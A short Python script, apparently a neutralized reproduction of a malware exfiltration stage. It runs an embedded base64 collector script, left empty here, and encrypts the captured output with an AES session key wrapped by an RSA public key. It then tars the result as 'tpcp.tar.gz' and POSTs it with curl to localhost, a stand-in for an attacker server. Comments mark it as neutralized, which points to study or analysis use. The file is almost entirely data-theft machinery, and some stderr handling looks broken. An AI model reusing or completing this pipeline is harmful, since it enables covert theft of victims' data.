import subprocess
import tempfile
import os
import base64
import sys

PUB_KEY_CONTENT = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCilXdWD1tc7mz7ZV+LB0dcGgMM
dqV2t32vJTQrFhLh5SAEDVyfqwCnOFqajy8pMze+LTYfpEt+U4Evc8l5bcjKXVfD
zeeSUdtzVNyRRaLkYU3PClnNXhjR/fxc4ElPGavaNgpSD70uMQWk6PrAjKIf2i3y
20GyolWkhxGuEK+7BwIDAQAB
-----END PUBLIC KEY-----"""  # random key

# this is the neutralized script
B64_SCRIPT = ""
d = "."

def run():
    collected = os.path.join(d, "c")
    pk = os.path.join(d, "p")
    sk = os.path.join(d, "session.key")
    ef = os.path.join(d, "payload.enc")
    ek = os.path.join(d, "session.key.enc")
    bn = os.path.join(d, "tpcp.tar.gz")

    try:
        payload = base64.b64decode(B64_SCRIPT)
        
        with open(collected, "wb") as f:
            subprocess.run(
                [sys.executable, "-"], 
                input=payload, 
                stdout=f, 
                stderr=f, 
                check=True
            )
    except Exception as e:
        print(e)

    if not os.path.exists(collected) or os.path.getsize(collected) == 0:
        print("collected is empty")
        return

    try:
        with open(collected, "r") as file:
            print("collected: ")
            print(file.read())
    except:
        pass

    with open(pk, "w") as f:
        f.write(PUB_KEY_CONTENT)

    try:
        subprocess.run(["openssl", "rand", "-out", sk, "32"], check=True)
        subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef, "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=f)
        subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk, "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"], check=True, stderr=f)
        subprocess.run(["tar", "-czf", bn, "-C", d, "payload.enc", "session.key.enc"], check=True)

        # we post nowhere
        subprocess.run([
            "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
            "https://localhost",
            "-H", "Content-Type: application/octet-stream",
            "-H", "X-Filename: tpcp.tar.gz",
            "--data-binary", f"@{bn}"
        ], check=True, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    run()
